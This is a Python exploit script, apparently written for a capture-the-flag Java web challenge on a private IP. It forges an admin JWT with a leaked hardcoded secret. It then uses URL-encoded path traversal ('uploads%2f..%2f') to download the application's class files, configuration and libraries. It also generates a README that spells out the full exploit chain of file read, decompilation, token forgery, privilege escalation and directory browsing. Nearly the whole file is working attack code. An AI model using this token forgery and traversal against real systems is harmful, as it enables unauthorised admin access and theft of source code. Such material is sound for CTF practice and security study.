#!/usr/bin/env python3
"""
还原完整的项目源码到app目录
"""

import requests
import jwt
import os
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

BASE_URL = "http://192.168.18.25:25004"
JWT_SECRET = "secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret"
OUTPUT_DIR = "app"

def create_admin_session():
    """创建admin session"""
    payload = {
        "sub": "admin",
        "exp": datetime.now(timezone.utc) + timedelta(minutes=30)
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS512")
    session = requests.Session()
    session.cookies.set("jwt", token)
    return session

def download_file(session, remote_path, local_path):
    """下载文件"""
    # 使用URL编码绕过路径
    encoded_path = remote_path.replace('/', '%2f')
    url = f"{BASE_URL}/download?path=uploads%2f..%2f{encoded_path}"
    
    r = session.get(url)
    if r.status_code == 200:
        os.makedirs(os.path.dirname(local_path), exist_ok=True)
        
        # 根据文件类型决定写入模式
        if local_path.endswith('.class') or local_path.endswith('.jar'):
            with open(local_path, 'wb') as f:
                f.write(r.content)
        else:
            with open(local_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(r.text)
        
        print(f"[+] {local_path}")
        return True
    else:
        print(f"[x] Failed: {remote_path} ({r.status_code})")
        return False

def restore_webapp_structure(session):
    """还原webapp结构"""
    print("\n[*] 还原WebApp结构...")
    
    # 前端文件
    frontend_files = [
        "index.html",
        "dashboard.html",
        "register.html",
        "admin.html",
        "css/index-style.css",
        "css/dashboard.css",
        "css/admin.css",
        "js/index.js",
        "js/dashboard.js",
        "js/register.js",
        "js/admin.js",
    ]
    
    for file in frontend_files:
        download_file(session, file, f"{OUTPUT_DIR}/{file}")
    
    # WEB-INF文件
    webinf_files = [
        "WEB-INF/web.xml",
        "META-INF/MANIFEST.MF",
    ]
    
    for file in webinf_files:
        download_file(session, file, f"{OUTPUT_DIR}/{file}")
    
    # Java class文件
    java_classes = [
        "WEB-INF/classes/com/ctf/LoginServlet.class",
        "WEB-INF/classes/com/ctf/RegisterServlet.class",
        "WEB-INF/classes/com/ctf/DashboardServlet.class",
        "WEB-INF/classes/com/ctf/AdminDashboardServlet.class",
        "WEB-INF/classes/com/ctf/BackUpServlet.class",
        "WEB-INF/classes/com/ctf/JwtUtil.class",
        "WEB-INF/classes/com/ctf/UserTransactionManager.class",
        "WEB-INF/classes/com/ctf/UserTransactionManager$TransactionListener.class",
        "WEB-INF/classes/com/ctf/UserTransactionManager$UserInfo.class",
        "WEB-INF/classes/com/ctf/DashboardServlet$Stats.class",
        "WEB-INF/classes/com/ctf/DashboardServlet$1.class",
    ]
    
    for file in java_classes:
        download_file(session, file, f"{OUTPUT_DIR}/{file}")

def list_and_download_libs(session):
    """列出并下载lib文件"""
    print("\n[*] 下载依赖库...")
    
    libs = [
        "jjwt-api-0.11.5.jar",
        "jjwt-impl-0.11.5.jar",
        "jjwt-jackson-0.11.5.jar",
        "tar-1.0.jar",
        "jackson-core-2.12.6.jar",
        "jackson-annotations-2.12.6.jar",
        "jackson-databind-2.12.6.1.jar",
        "json-20240303.jar",
    ]
    
    for lib in libs:
        download_file(session, f"WEB-INF/lib/{lib}", f"{OUTPUT_DIR}/WEB-INF/lib/{lib}")

def create_readme(session):
    """创建README说明文档"""
    print("\n[*] 创建README...")
    
    readme_content = """# PCB5-ez_java 项目源码还原

## 项目结构

```
app/
├── index.html              # 登录页面
├── dashboard.html          # 用户仪表板
├── register.html           # 注册页面
├── admin.html              # 管理员页面
├── css/                    # 样式文件
│   ├── index-style.css
│   ├── dashboard.css
│   └── admin.css
├── js/                     # JavaScript文件
│   ├── index.js
│   ├── dashboard.js
│   ├── register.js
│   └── admin.js
├── WEB-INF/
│   ├── web.xml             # Web应用配置
│   ├── classes/com/ctf/    # Java类文件
│   │   ├── LoginServlet.class
│   │   ├── RegisterServlet.class
│   │   ├── DashboardServlet.class
│   │   ├── AdminDashboardServlet.class
│   │   ├── BackUpServlet.class
│   │   ├── JwtUtil.class
│   │   └── UserTransactionManager.class
│   └── lib/                # 依赖库
│       ├── jjwt-*.jar      # JWT库
│       ├── jackson-*.jar   # JSON库
│       └── tar-1.0.jar     # TAR库
└── META-INF/
    └── MANIFEST.MF         # Manifest文件
```

## 关键发现

### 1. JWT密钥泄露
- **密钥**: `secret-secret-secret-secret-secret-secret-secret-secret-secret-secret-secret`
- **算法**: HS512
- 位置: `JwtUtil.class`

### 2. 任意文件读取漏洞
- **Rewrite规则**: `RewriteRule ^/download$ /%2 [B,L]`
- **绕过方法**: `uploads%2f..%2f<path>`
- 示例: `/download?path=uploads%2f..%2fWEB-INF%2fweb.xml`

### 3. Admin权限提升
- 伪造JWT token with sub="admin"
- 访问 `/admin/challengeResourceDir` 修改资源目录
- 通过修改resourceDir可以浏览任意目录

### 4. Servlet映射
- `/login` - LoginServlet
- `/register` - RegisterServlet
- `/dashboard/*` - DashboardServlet
- `/admin/*` - AdminDashboardServlet (需要admin权限)
- `/backup/*` - BackUpServlet (需要key参数)

## 漏洞利用链

1. **文件读取** → 读取WEB-INF/classes下的class文件
2. **反编译** → 获取JWT密钥和业务逻辑
3. **JWT伪造** → 生成admin token
4. **权限提升** → 访问admin端点
5. **目录遍历** → 通过resourceDir浏览文件系统

## 工具和脚本

已提供的exploit脚本:
- `jwt_exploit.py` - JWT伪造攻击
- `final_exploit.py` - 文件读取漏洞利用
- `search_flag_admin.py` - 使用admin权限搜索flag
"""
    
    with open(f"{OUTPUT_DIR}/README.md", 'w', encoding='utf-8') as f:
        f.write(readme_content)
    
    print(f"[+] {OUTPUT_DIR}/README.md")

def create_pom_xml():
    """创建pom.xml"""
    print("\n[*] 创建pom.xml...")
    
    pom_content = """<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>myapp</groupId>
    <artifactId>servlet-test</artifactId>
    <version>1.0</version>
    <packaging>war</packaging>

    <properties>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <dependencies>
        <!-- Servlet API -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>javax.servlet-api</artifactId>
            <version>4.0.1</version>
            <scope>provided</scope>
        </dependency>

        <!-- JWT -->
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-api</artifactId>
            <version>0.11.5</version>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-impl</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt-jackson</artifactId>
            <version>0.11.5</version>
            <scope>runtime</scope>
        </dependency>

        <!-- Jackson -->
        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-databind</artifactId>
            <version>2.12.6.1</version>
        </dependency>

        <!-- JSON -->
        <dependency>
            <groupId>org.json</groupId>
            <artifactId>json</artifactId>
            <version>20240303</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-war-plugin</artifactId>
                <version>3.3.2</version>
            </plugin>
        </plugins>
    </build>
</project>
"""
    
    with open(f"{OUTPUT_DIR}/pom.xml", 'w', encoding='utf-8') as f:
        f.write(pom_content)
    
    print(f"[+] {OUTPUT_DIR}/pom.xml")

def main():
    print(f"[*] 开始还原项目源码到 {OUTPUT_DIR} 目录")
    
    # 创建输出目录
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    # 创建admin session
    session = create_admin_session()
    print("[+] Admin session创建成功")
    
    # 还原webapp结构
    restore_webapp_structure(session)
    
    # 下载依赖库
    list_and_download_libs(session)
    
    # 创建文档
    create_readme(session)
    create_pom_xml()
    
    print(f"\n[✓] 项目源码已还原到 {OUTPUT_DIR} 目录")
    print(f"[*] 总结:")
    print(f"    - 前端文件: HTML, CSS, JS")
    print(f"    - 后端文件: Servlet class文件")
    print(f"    - 配置文件: web.xml, MANIFEST.MF")
    print(f"    - 依赖库: WEB-INF/lib/*.jar")
    print(f"    - 文档: README.md, pom.xml")

if __name__ == "__main__":
    main()
